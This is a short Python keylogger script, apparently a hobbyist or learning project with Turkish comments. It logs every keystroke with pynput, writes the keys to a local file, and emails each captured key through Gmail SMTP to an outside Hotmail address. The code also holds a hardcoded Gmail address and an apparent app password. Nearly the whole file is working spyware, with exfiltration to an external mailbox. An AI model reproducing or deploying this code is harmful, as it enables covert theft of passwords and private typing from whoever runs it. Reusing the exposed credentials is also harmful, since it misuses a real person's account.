import pynput
from smtplib import SMTP
from pynput.keyboard import Key,Listener

count = 0
keys = []


def on_press(key):
    global count,keys
    count += 1
    print("{0} pressed".format(key))
    keys.append(key)
    
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log2.txt" , "a" , encoding="utf-8") as file:
        for key in keys:
            
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)
 

            try:
               #msg = input("mesajınızı giriniz : ")
               subject = "test mesajı"
               #message = msg
               content = "subject : {} \n\n {}".format(subject,key)
                
               mymail = "egeozcan2008@gmail.com"
               password = "ajujshbhdnwtajcm"
                
               sentto = "enesozcan@hotmail.com"
                
               mail = SMTP("smtp.gmail.com",587)
               mail.ehlo()  #maile bağlan
               mail.starttls()  #mesajı şifreler
               mail.login(mymail,password)
               mail.sendmail(mymail,sentto,content.encode("utf-8"))
               print("mesaj gönderme başarılı")
            except:
                print("hata mesaj gönderilmedi")


        
def on_release(key):
    if key == Key.esc:
        print("exit")
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join()
     

     
    